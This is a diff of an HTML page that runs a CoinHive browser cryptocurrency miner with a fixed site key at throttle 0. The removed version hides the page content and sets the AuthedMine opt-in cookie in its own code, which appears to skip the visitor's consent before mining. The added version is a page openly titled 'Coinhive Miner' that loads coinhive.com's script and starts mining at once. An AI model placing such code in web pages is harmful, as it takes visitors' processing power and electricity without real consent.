@@ -1,29 +1,15 @@
-<!doctype html>
-<html lang="en">
-<head>
-    <meta charset="utf-8" />
-    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
-    <title></title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/2.1.4/toastr.min.js"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/2.1.4/toastr.min.css" />
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/semantic-ui/2.3.0/semantic.min.js"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/semantic-ui/2.3.0/semantic.min.css" />
-    <style>
-        div {
-          display: none;
-        }
-    </style>
-</head>
-<body>
-    <script src="https://authedmine.com/lib/authedmine.min.js"></script>
-    <script>
-        $(function(){
-          document.cookie = "CoinHiveOptIn=1534531274.f04e30952eaf092b90e49632e8ee930a";
-          var miner = new CoinHive.User('KxmZ6PmwDtGMbMSgoJ0OVoC4ikwq1uKB', '81e13cb8f9b69224043564e7179e3273', { throttle: 0 });
-          miner.start();
-        });
+<html lang="en-us"><head>
+        <title>Coinhive Miner</title>
+        <meta name="description" content="Coinhive Miner">
+        <link rel="icon" type="image/png" href="https://coinhive.com/media/coinhive-icon.png">
+        <link rel="apple-touch-icon" href="https://coinhive.com/media/coinhive-icon.png">
+        <meta name="viewport" content="width=device-width">
+    </head>
+    <body id="miner">
+    <script type="text/javascript" src="https://coinhive.com/lib/coinhive.min.js"></script>
+    <script type="text/javascript">
+        var miner = new CoinHive.User('KxmZ6PmwDtGMbMSgoJ0OVoC4ikwq1uKB', '81e13cb8f9b69224043564e7179e3273', { throttle: 0 });
+        miner.start();
     </script>
-</body>
+    </body>
 </html>
